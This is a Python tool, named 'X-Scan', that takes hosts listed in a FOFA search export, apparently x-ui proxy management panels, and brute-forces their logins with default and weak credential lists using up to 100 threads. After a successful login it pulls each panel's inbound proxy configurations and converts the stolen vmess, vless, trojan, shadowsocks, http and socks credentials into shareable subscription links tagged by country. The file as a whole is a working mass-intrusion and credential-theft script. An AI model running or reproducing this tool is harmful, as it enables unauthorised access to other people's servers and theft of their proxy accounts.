import requests
import json
import base64
import urllib.parse
import re
import geoip2.database
from concurrent.futures import ThreadPoolExecutor, as_completed
import random
import string
import threading
from tenacity import retry, stop_after_attempt, wait_exponential
import pandas as pd
import glob
import os

# 配置部分
geoip_database_path = "./GeoLite2-Country.mmdb"
ip_file_path = "./ip.txt"
output_file_path = "./link.json"
links_output_file_path = "./links.txt"

# 线程安全相关
file_lock = threading.Lock()  # 文件写入锁
counter_lock = threading.Lock()  # 计数器锁
success_counter = 0  # 成功计数
failed_counter = 0   # 失败计数

# 重试配置
MAX_RETRIES = 3  # 最大重试次数
WAIT_MULTIPLIER = 1  # 重试等待时间的基数（秒）
MAX_WAIT = 10  # 最大等待时间（秒）

# 认证相关配置和函数
USERNAME_LIST = ['admin', 'root', 'test', 'abc123']
PASSWORD_LIST = ['admin', '123456', 'test', 'abc123', '666666', '888888', '88888888']

# 添加密码统计计数器
default_auth_counter = 0  # 默认密码成功数
other_auth_counter = 0    # 其他密码组合成功数

# FOFA 扫描相关函数
def get_csv_files():
    """获取当前目录下的所有 CSV 文件"""
    return glob.glob('*.csv')

def select_csv_file():
    """让用户选择一个 CSV 文件"""
    csv_files = get_csv_files()
    if not csv_files:
        print("当前目录下没有找到 CSV 文件。")
        return None
    print("请选择一个 CSV 文件进行处理：")
    for idx, file in enumerate(csv_files):
        print(f"{idx + 1}: {file}")
    while True:
        try:
            choice = int(input("输入文件编号：")) - 1
            if 0 <= choice < len(csv_files):
                return csv_files[choice]
            else:
                print("无效的选择，请重新输入。")
        except ValueError:
            print("请输入有效的编号。")

def check_host(link, success_links):
    """检查主机状态并尝试登录"""
    global default_auth_counter, other_auth_counter
    try:
        # 首先检查主机是否在线
        response = requests.get(link, timeout=1)
        if response.status_code == 200:
            # 首先尝试默认密码
            login_payload = {'username': 'admin', 'password': 'admin'}
            login_response = requests.post(f'{link}/login', data=login_payload, timeout=1)
            if 'true' in login_response.text:
                print(f'[+] {link} - 使用默认密码(admin/admin)登录成功')
                default_auth_counter += 1
                success_links.append(link)
                return

            # 如果默认密码失败，尝试其他组合
            print(f'[-] {link} - 默认密码失败，尝试其他组合...')
            for username in USERNAME_LIST:
                for password in PASSWORD_LIST:
                    # 跳过已经尝试过的 admin/admin 组合
                    if username == "admin" and password == "admin":
                        continue
                    
                    login_payload = {'username': username, 'password': password}
                    try:
                        login_response = requests.post(f'{link}/login', data=login_payload, timeout=1)
                        if 'true' in login_response.text:
                            print(f'[+] {link} - 使用组合({username}/{password})登录成功')
                            other_auth_counter += 1
                            success_links.append(link)
                            return
                    except requests.RequestException:
                        continue
            
            print(f'[x] {link} - 所有密码组合尝试失败')
    except requests.RequestException:
        pass

def scan_from_fofa():
    """从 FOFA 导出的 CSV 文件中扫描"""
    global default_auth_counter, other_auth_counter
    default_auth_counter = 0
    other_auth_counter = 0
    
    csv_file = select_csv_file()
    if csv_file:
        df = pd.read_csv(csv_file)
        link_list = df['link'].tolist()
        success_links = []

        print(f"\n开始扫描 {len(link_list)} 个目标...")
        
        # 降低并发数以避免请求过快
        with ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(lambda link: check_host(link, success_links), link_list)

        print(f"\n扫描完成！")
        print(f"发现 {len(success_links)} 个可用目标")
        print(f"默认密码成功: {default_auth_counter}")
        print(f"其他密码成功: {other_auth_counter}")
        
        # 保存结果时包含密码信息
        with open('ip.txt', 'w') as f:
            for link in success_links:
                f.write(f'{link}\n')
        print("结果已保存到 ip.txt")

def getSession(url):
    """获取会话 cookie，尝试不同的用户名和密码组合"""
    global default_auth_counter, other_auth_counter
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    }

    # 首先尝试默认的 admin/admin 组合
    session = try_login(url, "admin", "admin", headers)
    if session:
        default_auth_counter += 1
        print(f"[+] {url} - 使用默认密码(admin/admin)登录成功")
        return session, "admin", "admin"

    print(f"[-] {url} - 默认密码失败，尝试其他组合...")
    # 如果默认组合失败，尝试其他组合
    for username in USERNAME_LIST:
        for password in PASSWORD_LIST:
            # 跳过已经尝试过的 admin/admin 组合
            if username == "admin" and password == "admin":
                continue
            
            session = try_login(url, username, password, headers)
            if session:
                other_auth_counter += 1
                print(f"[+] {url} - 使用组合({username}/{password})登录成功")
                return session, username, password
    
    print(f"[x] {url} - 所有密码组合尝试失败")
    return None, None, None

@retry(stop=stop_after_attempt(MAX_RETRIES),
       wait=wait_exponential(multiplier=WAIT_MULTIPLIER, max=MAX_WAIT))
def try_login(url, username, password, headers):
    """尝试单个用户名密码组合，带重试机制"""
    try:
        data = {"username": username, "password": password}
        response = requests.post(url + "/login", data=data, headers=headers, timeout=5)
        if response.status_code == 200:
            return response.cookies.get("session")
    except (requests.exceptions.RequestException, requests.exceptions.Timeout):
        pass
    return None

def update_counters(success=False):
    """更新成功/失败计数器"""
    global success_counter, failed_counter
    with counter_lock:
        if success:
            success_counter += 1
        else:
            failed_counter += 1

# 地理位置和命名相关函数
def get_country_from_ip(ip_address):
    """获取IP地址的国家信息，优先显示中文名称"""
    try:
        with geoip2.database.Reader(geoip_database_path) as reader:
            response = reader.country(ip_address)
            return response.country.names.get('zh-CN', ip_address)
    except Exception:
        return ip_address

def generate_random_suffix():
    """生成一个字母在前和一个编号（0-100）在后的后缀"""
    random_letter = random.choice(string.ascii_uppercase)
    random_number = random.randint(0, 100)
    return f"{random_letter}{random_number}"

# 链接生成和处理相关函数
def generate_subscription_links(data, ip_address):
    """生成订阅链接"""
    links = []
    country = get_country_from_ip(ip_address)

    # 给 country_with_suffix 一个默认值以避免 UnboundLocalError
    country_with_suffix = f"{country}-{generate_random_suffix()}"

    if data["success"]:
        for item in data["obj"]:
            if item["enable"]:
                # 为每个链接生成一个随机后缀
                country_suffix = generate_random_suffix()
                country_with_suffix = f"{country}-{country_suffix}"  # 使用国家名称和随机编号

                protocol = item["protocol"]
                port = item["port"]
                link = ""
                if protocol == "vless":
                    settings = json.loads(item["settings"])
                    client_id = settings["clients"][0]["id"]
                    flow = settings["clients"][0].get("flow", "")
                    stream_settings = json.loads(item["streamSettings"])
                    network = stream_settings["network"]
                    security = stream_settings["security"]
                    ws_settings = stream_settings.get("wsSettings", {})
                    path = ws_settings.get("path", "/")
                    query = f"type={network}&security={security}&path={urllib.parse.quote(path)}"
                    if flow:
                        query += f"&flow={flow}"
                    # 添加国家和编号到末尾
                    link = f"{protocol}://{client_id}@{ip_address}:{port}?{query}#{country_with_suffix}"
                elif protocol == "vmess":
                    settings = json.loads(item["settings"])
                    client_id = settings["clients"][0]["id"]
                    stream_settings = json.loads(item["streamSettings"])
                    network = stream_settings["network"]
                    ws_settings = stream_settings.get("wsSettings", {})
                    path = ws_settings.get("path", "/")
                    vmess_config = {
                        "v": "2",
                        "ps": country_with_suffix,
                        "add": ip_address,
                        "port": item["port"],
                        "id": client_id,
                        "aid": "0",
                        "net": network,
                        "type": "none",
                        "host": "",
                        "path": path,
                        "tls": "",
                    }
                    link = f"vmess://{base64.urlsafe_b64encode(json.dumps(vmess_config).encode()).decode().strip('=')}"
                elif protocol == "trojan":
                    settings = json.loads(item["settings"])
                    client_id = settings["clients"][0]["password"]
                    query = "type=tcp&security=tls"  # 假设 Trojran 协议默认的查询参数
                    # 添加国家和编号到末尾
                    link = f"trojan://{client_id}@{ip_address}:{port}/?{query}#{country_with_suffix}"
                elif protocol == "shadowsocks":
                    settings = json.loads(item["settings"])
                    method = settings["method"]
                    password = settings["password"]
                    # 添加国家和编号到末尾
                    link = f"ss://{base64.urlsafe_b64encode(f'{method}:{password}@{ip_address}:{port}'.encode()).decode().strip('=')}#{country_with_suffix}"
                elif protocol == "http":
                    settings = json.loads(item["settings"])
                    user = settings["accounts"][0]["user"]
                    password = settings["accounts"][0]["pass"]
                    # 拼接国家名称和随机后缀
                    link = f"{protocol}://{user}:{password}@{ip_address}:{port}/#{country_with_suffix}"
                elif protocol == "socks":
                    settings = json.loads(item["settings"])
                    user = settings["accounts"][0]["user"]
                    password = settings["accounts"][0]["pass"]
                    # 拼接国家名称和随机后缀
                    link = f"{protocol}://{user}:{password}@{ip_address}:{port}/#{country_with_suffix}"

                links.append(link)

    return links, ip_address, country_with_suffix

def classify_links(links):
    """按协议类型分类链接"""
    vmess_links = []
    vless_links = []
    trojan_links = []
    ss_links = []
    http_links = []
    socks_links = []

    for link in links:
        if link.startswith("vmess://"):
            vmess_links.append(link)
        elif link.startswith("vless://"):
            vless_links.append(link)
        elif link.startswith("trojan://"):
            trojan_links.append(link)
        elif link.startswith("ss://"):
            ss_links.append(link)
        elif link.startswith("http://"):
            http_links.append(link)
        elif link.startswith("socks://"):
            socks_links.append(link)
    
    return vmess_links, vless_links, trojan_links, ss_links, http_links, socks_links

# 数据获取和处理相关函数
def get_inbound_list(url, session_cookie):
    """获取节点列表"""
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": f"session={session_cookie}",
    }
    try:
        response = requests.post(url + "/xui/inbound/list", headers=headers, timeout=5)  # 设置超时时间为5秒
        response.raise_for_status()
        inbound_list = response.json()
        return inbound_list
    except (requests.exceptions.RequestException, requests.exceptions.Timeout):
        return None

def extract_ip_from_url(url):
    """从 URL 中提取 IP 地址"""
    ip_pattern = r"(?:http:\/\/|https:\/\/)?(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"
    match = re.search(ip_pattern, url)
    if match:
        return match.group(1)
    return None

def read_urls_from_file(file_path):
    """从文件中读取URL列表"""
    try:
        with open(file_path, "r") as file:
            urls = [line.strip() for line in file if line.strip()]
        return urls
    except FileNotFoundError:
        return []

def process_url(url):
    """处理单个 URL，获取订阅链接信息"""
    try:
        session_info = getSession(url)
        session, username, password = session_info if isinstance(session_info, tuple) else (None, None, None)
        
        if not session:
            update_counters(success=False)
            return None

        inbound_list = get_inbound_list(url, session)
        if not inbound_list:
            update_counters(success=False)
            return None

        ip_address = extract_ip_from_url(url)
        if ip_address:
            links, ip, country = generate_subscription_links(inbound_list, ip_address)
            if links:
                update_counters(success=True)
                return {
                    "url": url,
                    "links": links,
                    "ip": ip,
                    "country": country,
                    "login_info": {
                        "username": username,
                        "password": password
                    }
                }
        update_counters(success=False)
        return None
    except Exception as e:
        update_counters(success=False)
        print(f"Error processing {url}: {str(e)}")
        return None

def write_links_to_file(links, file_path):
    """线程安全的文件写入"""
    with file_lock:
        with open(file_path, "a") as f:
            for link in links:
                if link:
                    f.write(link + "\n")

def write_results_to_json(results):
    """将结果写入 JSON 文件"""
    with file_lock:
        with open(output_file_path, "w", encoding='utf-8') as f:
            json_data = {
                "total": len(results),
                "items": results
            }
            json.dump(json_data, f, ensure_ascii=False, indent=2)

def main_menu():
    """主菜单"""
    while True:
        print("\n=== X-Scan 工具 ===")
        print("1. 从 FOFA CSV 文件扫描目标")
        print("2. 从 ip.txt 提取链接")
        print("3. 退出")
        
        choice = input("\n请选择功能 (1-3): ")
        
        if choice == "1":
            scan_from_fofa()
        elif choice == "2":
            # 重置计数器
            global success_counter, failed_counter, default_auth_counter, other_auth_counter
            success_counter = 0
            failed_counter = 0
            default_auth_counter = 0
            other_auth_counter = 0
            
            urls = read_urls_from_file(ip_file_path)
            if not urls:
                print("ip.txt 文件不存在或为空！")
                continue
                
            print(f"\n开始处理 {len(urls)} 个目标...")
            results = []

            # 清空输出文件
            with open(links_output_file_path, "w") as f:
                pass

            # 使用线程池并发处理 URL
            with ThreadPoolExecutor(max_workers=50) as executor:
                future_to_url = {executor.submit(process_url, url): url for url in urls}
                for future in as_completed(future_to_url):
                    result = future.result()
                    if result:
                        write_links_to_file(result['links'], links_output_file_path)
                        results.append(result)

            # 导出结果
            write_results_to_json(results)

            # 读取所有链接进行分类
            with file_lock:
                with open(links_output_file_path, "r") as file:
                    all_links = file.readlines()

            vmess_links, vless_links, trojan_links, ss_links, http_links, socks_links = classify_links(all_links)

            # 重新写入分类后的链接
            with file_lock:
                with open(links_output_file_path, "w") as links_file:
                    for link_group in [vmess_links, vless_links, trojan_links, ss_links, http_links, socks_links]:
                        links_file.write("\n")
                        links_file.writelines(link_group)

            # 打印统计信息
            print(f"\n处理完成！")
            print(f"成功数量: {success_counter}")
            print(f"失败数量: {failed_counter}")
            print(f"总处理数量: {len(urls)}")
            print(f"成功率: {(success_counter/len(urls))*100:.2f}%")
            print(f"\n密码统计:")
            print(f"默认密码(admin/admin)成功: {default_auth_counter}")
            print(f"其他密码组合成功: {other_auth_counter}")
            
        elif choice == "3":
            print("感谢使用！")
            break
        else:
            print("无效的选择，请重试。")

if __name__ == "__main__":
    main_menu()
